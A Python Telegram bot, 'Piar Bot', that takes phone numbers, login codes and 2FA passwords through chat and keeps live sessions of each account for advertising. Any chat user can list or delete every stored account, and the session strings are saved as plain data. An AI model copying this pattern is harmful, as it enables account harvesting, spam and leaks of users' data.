import asyncio
import logging
import sqlite3
import os
import getpass
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from datetime import timedelta
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, PhoneCodeExpiredError
from dotenv import load_dotenv
from config import TELEGRAM_BOT_TOKEN

# Завантажуємо змінні з .env файлу
load_dotenv()

# API дані з .env файлу
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")

# Налаштування логування
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# База даних (та сама що й у authorizade.py)
class Database:
    def __init__(self, db_path: str = "accounts.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Ініціалізація бази даних та створення таблиці"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS accounts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    phone_number TEXT UNIQUE NOT NULL,
                    api_id INTEGER NOT NULL,
                    api_hash TEXT NOT NULL,
                    session_string TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    username TEXT,
                    user_id INTEGER,
                    is_active BOOLEAN DEFAULT 1,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_used TIMESTAMP
                )
            """)
            conn.commit()
    
    def add_account(self, phone_number: str, api_id: int, api_hash: str, 
                   session_string: str = None, first_name: str = None, 
                   last_name: str = None, username: str = None, 
                   user_id: int = None) -> bool:
        """Додати новий аккаунт до бази даних"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT OR REPLACE INTO accounts 
                    (phone_number, api_id, api_hash, session_string, first_name, 
                     last_name, username, user_id, is_active, last_used)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP)
                """, (phone_number, api_id, api_hash, session_string, 
                      first_name, last_name, username, user_id))
                conn.commit()
                return True
        except Exception as e:
            logger.error(f"❌ Помилка при додаванні аккаунта: {e}")
            return False
    
    def get_accounts(self) -> list:
        """Отримати всі аккаунти з бази даних"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT * FROM accounts WHERE is_active = 1 
                    ORDER BY created_at DESC
                """)
                accounts = []
                for row in cursor.fetchall():
                    accounts.append(dict(row))
                return accounts
        except Exception as e:
            logger.error(f"❌ Помилка при отриманні аккаунтів: {e}")
            return []
    
    def delete_account(self, phone_number: str) -> bool:
        """Видалити аккаунт з бази даних та файл сесії"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute("DELETE FROM accounts WHERE phone_number = ?", (phone_number,))
                conn.commit()
                
                if cursor.rowcount > 0:
                    # Видаляємо файл сесії
                    session_name = f"sessions/temp_{phone_number.replace('+', '').replace('-', '')}"
                    if os.path.exists(session_name + ".session"):
                        os.remove(session_name + ".session")
                    if os.path.exists(session_name + ".session-journal"):
                        os.remove(session_name + ".session-journal")
                    return True
                return False
        except Exception as e:
            logger.error(f"❌ Помилка при видаленні аккаунта: {e}")
            return False


# Стани для FSM
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()
    waiting_for_phone_to_delete = State()  # Додано стан для видалення аккаунта

# Ініціалізація бота та диспетчера
bot = Bot(token=TELEGRAM_BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()

# Ініціалізація бази даних
db = Database()

# Перевірка конфігурації
if not API_ID or not API_HASH:
    logger.error("❌ Помилка: API_ID або API_HASH не встановлено!")
    logger.error("Створіть .env файл з правильними даними")
    exit(1)

@router.message(Command("start"))
async def cmd_start(message: Message):
    """Обробник команди /start"""
    welcome_text = f"""
🍽️ Ласкаво просимо до Piar Bot

🆔 Ваш ID: {message.from_user.id}

Я бот для реклами в telegram)

💡 Доступні команди:
/start - Почати роботу
/register_number - Привязать номер телефона
/accounts - Список аккаунтів
/delete_account - видалити аккаунт
/status_account - статус аккаунта
    """
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🗑️ Видалити аккаунт", callback_data="delete_account")]
    ])
    
    await message.answer(welcome_text, reply_markup=keyboard)

# Правильний callback handler
@router.callback_query(lambda c: c.data == "delete_account")
async def delete_account_callback(callback: CallbackQuery, state: FSMContext):
    """Обробка натискання кнопки видалення аккаунта"""
    await callback.message.answer("🔄 Введіть номер телефону аккаунта для видалення:")
    await state.set_state(RegistrationStates.waiting_for_phone_to_delete)
    await callback.answer()

@router.message(RegistrationStates.waiting_for_phone_to_delete)
async def process_delete_phone(message: Message, state: FSMContext):
    """Обробка номера телефону для видалення"""
    phone_number = message.text.strip()
    
    if not phone_number.startswith('+') or len(phone_number) < 10:
        await message.answer("❌ Невірний формат номера телефону! Спробуйте ще раз (формат +380XXXXXXXXX):")
        return
    
    success = db.delete_account(phone_number)
    if success:
        await message.answer("✅ Аккаунт успішно видалено!")
    else:
        await message.answer("❌ Аккаунт не знайден!")
    
    await state.clear()

@router.message(Command("register_number"))
async def cmd_register_number(message: Message, state: FSMContext):
    """Обробник команди /register_number"""
    await message.answer(
        "📱 Введіть номер телефону для реєстрації (формат +380XXXXXXXXX):"
    )
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(RegistrationStates.waiting_for_phone)
async def process_phone_number(message: Message, state: FSMContext):
    """Обробка номера телефону"""
    phone_number = message.text.strip()
    
    # Перевіряємо формат номера
    if not phone_number.startswith('+') or len(phone_number) < 10:
        await message.answer("❌ Невірний формат номера телефону! Спробуйте ще раз (формат +380XXXXXXXXX):")
        return
    
    # Перевіряємо чи аккаунт вже існує
    accounts = db.get_accounts()
    for account in accounts:
        if account['phone_number'] == phone_number:
            await message.answer(f"✅ Аккаунт {phone_number} вже зареєстрований!")
            await state.clear()
            return
    
    # Зберігаємо номер телефону в стані
    await state.update_data(phone_number=phone_number)
    
    try:
        # Створюємо клієнт
        session_name = f"sessions/temp_{phone_number.replace('+', '').replace('-', '')}"
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        await message.answer("🔗 Підключення до Telegram...")
        await client.connect()
        
        if not await client.is_user_authorized():
            await message.answer(f"📱 Відправка коду підтвердження на {phone_number}...")
            try:
                await client.send_code_request(phone_number)
                await message.answer("✅ Код відправлено успішно! Введіть код підтвердження:")
                await state.set_state(RegistrationStates.waiting_for_code)
                # Зберігаємо клієнт в стані
                await state.update_data(client=client)
            except Exception as e:
                await message.answer(f"❌ Помилка при відправці коду: {e}")
                await client.disconnect()
                await state.clear()
                return
        else:
            # Користувач вже авторизований
            await message.answer("✅ Аккаунт вже авторизований!")
            await client.disconnect()
            await state.clear()
            
    except Exception as e:
        await message.answer(f"❌ Помилка підключення: {e}")
        await state.clear()

@router.message(RegistrationStates.waiting_for_code)
async def process_verification_code(message: Message, state: FSMContext):
    """Обробка коду підтвердження"""
    code = message.text.strip()
    data = await state.get_data()
    phone_number = data['phone_number']
    client = data['client']
    
    try:
        await client.sign_in(phone=phone_number, code=code)
        
        # Отримуємо інформацію про користувача
        me = await client.get_me()
        session_string = client.session.save()
        
        # Зберігаємо в базу даних
        success = db.add_account(
            phone_number=phone_number,
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            first_name=me.first_name,
            last_name=me.last_name,
            username=me.username,
            user_id=me.id
        )
        
        if success:
            success_message = f"""
✅ <b>Аккаунт успішно додано до бази даних!</b>

📱 <b>Номер:</b> {phone_number}
👤 <b>Ім'я:</b> {me.first_name or 'Не вказано'}
👤 <b>Прізвище:</b> {me.last_name or 'Не вказано'}
🔗 <b>Username:</b> @{me.username or 'Не вказано'}
🆔 <b>ID:</b> {me.id}
            """
            await message.answer(success_message, parse_mode='HTML')
        else:
            await message.answer("❌ Помилка при збереженні в базу даних!")
            
    except SessionPasswordNeededError:
        await message.answer("🔐 Увімкнено двофакторну автентифікацію (2FA). Введіть пароль:")
        await state.set_state(RegistrationStates.waiting_for_password)
        return
    except PhoneCodeInvalidError:
        await message.answer("❌ Невірний код! Спробуйте ще раз:")
        return
    except PhoneCodeExpiredError:
        await message.answer("❌ Код застарів! Почніть реєстрацію заново командою /register_number")
        await client.disconnect()
        await state.clear()
        return
    except Exception as e:
        await message.answer(f"❌ Помилка: {e}")
        await client.disconnect()
        await state.clear()
        return
    
    finally:
        if 'client' in data:
            await client.disconnect()
        await state.clear()

@router.message(RegistrationStates.waiting_for_password)
async def process_2fa_password(message: Message, state: FSMContext):
    """Обробка пароля 2FA"""
    password = message.text.strip()
    data = await state.get_data()
    phone_number = data['phone_number']
    client = data['client']
    
    try:
        await client.sign_in(password=password)
        
        # Отримуємо інформацію про користувача
        me = await client.get_me()
        session_string = client.session.save()
        
        # Зберігаємо в базу даних
        success = db.add_account(
            phone_number=phone_number,
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            first_name=me.first_name,
            last_name=me.last_name,
            username=me.username,
            user_id=me.id
        )
        
        if success:
            success_message = f"""
✅ <b>Аккаунт успішно додано до бази даних!</b>

📱 <b>Номер:</b> {phone_number}
👤 <b>Ім'я:</b> {me.first_name or 'Не вказано'}
👤 <b>Прізвище:</b> {me.last_name or 'Не вказано'}
🔗 <b>Username:</b> @{me.username or 'Не вказано'}
🆔 <b>ID:</b> {me.id}
            """
            await message.answer(success_message, parse_mode='HTML')
        else:
            await message.answer("❌ Помилка при збереженні в базу даних!")
            
    except Exception as e:
        await message.answer(f"❌ Помилка авторизації: {e}")
    finally:
        await client.disconnect()
        await state.clear()

@router.message(Command("accounts"))
async def cmd_accounts(message: Message):
    """Обробник команди /accounts - показує список всіх аккаунтів"""
    try:
        accounts = db.get_accounts()
        
        if not accounts:
            await message.answer("📋 Список аккаунтів порожній.\n\nВикористайте команду /register_number для додавання нового аккаунта.")
            return
        
        # Формуємо повідомлення зі списком аккаунтів
        accounts_text = "📋 <b>Список зареєстрованих аккаунтів:</b>\n\n"
        
        for i, account in enumerate(accounts, 1):
            status_emoji = "✅" if account['is_active'] else "❌"
            accounts_text += f"{i}. {status_emoji} <b>{account['phone_number']}</b>\n"
            accounts_text += f"   👤 {account['first_name'] or 'Не вказано'} {account['last_name'] or ''}\n"
            if account['username']:
                accounts_text += f"   🔗 @{account['username']}\n"
            accounts_text += f"   🆔 ID: {account['user_id']}\n"
            accounts_text += f"   📅 Додано: {account['created_at']}\n"
            if account['last_used']:
                accounts_text += f"   🕒 Останнє використання: {account['last_used']}\n"
            accounts_text += "\n"
        
        # Якщо повідомлення занадто довге, розбиваємо на частини
        if len(accounts_text) > 4000:
            # Розбиваємо на частини по 4000 символів
            parts = []
            current_part = "📋 <b>Список зареєстрованих аккаунтів:</b>\n\n"
            
            for i, account in enumerate(accounts, 1):
                account_text = f"{i}. ✅ <b>{account['phone_number']}</b>\n"
                account_text += f"   👤 {account['first_name'] or 'Не вказано'} {account['last_name'] or ''}\n"
                if account['username']:
                    account_text += f"   🔗 @{account['username']}\n"
                account_text += f"   🆔 ID: {account['user_id']}\n"
                account_text += f"   📅 Додано: {account['created_at']}\n\n"
                
                if len(current_part + account_text) > 4000:
                    parts.append(current_part)
                    current_part = account_text
                else:
                    current_part += account_text
            
            if current_part:
                parts.append(current_part)
            
            # Відправляємо частини
            for part in parts:
                await message.answer(part, parse_mode='HTML')
        else:
            await message.answer(accounts_text, parse_mode='HTML')
            
    except Exception as e:
        logger.error(f"❌ Помилка при отриманні списку аккаунтів: {e}")
        await message.answer("❌ Помилка при отриманні списку аккаунтів. Спробуйте пізніше.")

@router.message(Command("delete_account"))
async def cmd_delete_account(message: Message, state: FSMContext):
    """Обробник команди /delete_account - видаляє аккаунт"""
    await message.answer("🔄 Введіть номер телефону аккаунта для видалення: ")
    await state.set_state(RegistrationStates.waiting_for_phone_to_delete)


async def main():
    """Головна функція"""
    try:
        # Підключаємо роутери
        dp.include_router(router)
        logger.info("🔄 Запуск бота...")
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"❌ Помилка при запуску бота: {e}")
        raise

if __name__ == '__main__':
    asyncio.run(main())